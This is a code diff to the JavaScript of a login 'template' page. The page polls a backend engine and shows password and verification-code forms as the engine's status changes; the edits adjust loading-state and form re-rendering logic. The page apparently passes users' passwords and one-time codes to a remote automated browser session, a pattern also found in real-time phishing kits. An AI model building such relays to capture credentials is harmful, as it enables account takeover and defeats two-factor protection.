@@ -439,17 +439,11 @@
                 const data = await res.json();
                 console.log('[Template] Poll response:', data.currentStatus, '| data:', JSON.stringify(data.data || {}).substring(0, 200));
                 if (data.currentStatus) {
-                    // FIX: If engine is retrying (password unavailable or wrong code),
-                    // stay in loading state - don't clear isProcessing or show form
-                    if (isProcessing && (data.currentStatus === 'WAITINGPASSWORD' || data.currentStatus === 'WAITINGCODE')) {
-                        try {
-                            const ljr = data.data && data.data.lastJsonResponse ? (typeof data.data.lastJsonResponse === 'string' ? JSON.parse(data.data.lastJsonResponse) : data.data.lastJsonResponse) : null;
-                            if (ljr && ljr.engineRetrying === true) {
-                                console.log('[Template] Engine retrying, staying in loading state');
-                                return;
-                            }
-                        } catch (e) {}
+                    if (data.engineProcessing) {
+                        console.log('[Template] engineProcessing=true | preserving UI for status:', data.currentStatus, '| browserId:', browserId);
+                        return;
                     }
+                    console.log('[Template] engineProcessing=false | updating UI for status:', data.currentStatus, '| browserId:', browserId);
                     isProcessing = false;
                     updateUIForStatus(data.currentStatus, data.data || {});
                 }
@@ -546,16 +540,25 @@
                 case 'WAITINGPASSWORD':
                 case 'WAITINGPASSWORDERROR':
                     lastFormVisibleStatus = status;
-                    setFormSubmitting(false);
-                    emailGroup.style.display = 'block';
-                    passwordGroup.style.display = 'block';
-                    verificationOptionsGroup.style.display = 'none';
-                    verificationCodeGroup.style.display = 'none';
-                    submitButton.value = 'Verify';
-                    if (data.email) emailField.value = data.email;
-                    emailField.readOnly = true;
-                    passwordField.disabled = false;
-                    passwordField.readOnly = false;
+                    console.log('[Template] WAITINGPASSWORD | statusChanged:', statusChanged, '| browserId:', browserId);
+                    if (statusChanged) {
+                        console.log('[Template] WAITINGPASSWORD: rendering form (status transition from', currentStatus, ')');
+                        setFormSubmitting(false);
+                        emailGroup.style.display = 'block';
+                        passwordGroup.style.display = 'block';
+                        verificationOptionsGroup.style.display = 'none';
+                        verificationCodeGroup.style.display = 'none';
+                        submitButton.value = 'Verify';
+                        if (data.email) emailField.value = data.email;
+                        emailField.readOnly = true;
+                        passwordField.disabled = false;
+                        passwordField.readOnly = false;
+                        if (!isSameStatusDuringSubmit) {
+                            hideLoadingOverlay();
+                        }
+                    } else {
+                        console.log('[Template] WAITINGPASSWORD: preserving form (no status change)');
+                    }
                     if (data.lastJsonResponse) {
                         try {
                             const r = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : data.lastJsonResponse;
@@ -567,9 +570,6 @@
                     } else if (status === 'WAITINGPASSWORDERROR') {
                         document.getElementById('InvalidPassword').textContent = 'Incorrect password. Please try again.';
                         document.getElementById('InvalidPassword').style.display = 'block';
-                    }
-                    if (!isSameStatusDuringSubmit) {
-                        hideLoadingOverlay();
                     }
                     startPolling(2000);
                     break;
@@ -602,9 +602,6 @@
                     verificationOptionsGroup.style.display = 'none';
                     verificationCodeGroup.style.display = 'block';
                     submitButton.value = 'Submit Code';
-                    if (statusChanged) {
-                        verificationCodeInput.value = '';
-                    }
                     const viewName = (data && data.viewName) || (data && data.lastJsonResponse ? (typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse || '{}') : data.lastJsonResponse).viewName : '') || '';
                     const codeLabel = document.getElementById('verificationCodeLabel');
                     if (codeLabel) {
@@ -919,9 +916,6 @@
                 });
                 if (!res.ok) throw new Error('HTTP ' + res.status);
                 await res.json();
-                if (updateType === 'verificationChoice') {
-                    await new Promise(resolve => setTimeout(resolve, 3000));
-                }
                 isProcessing = true;
                 updateUIForStatus('PROCESSING', {});
             } catch (e) {
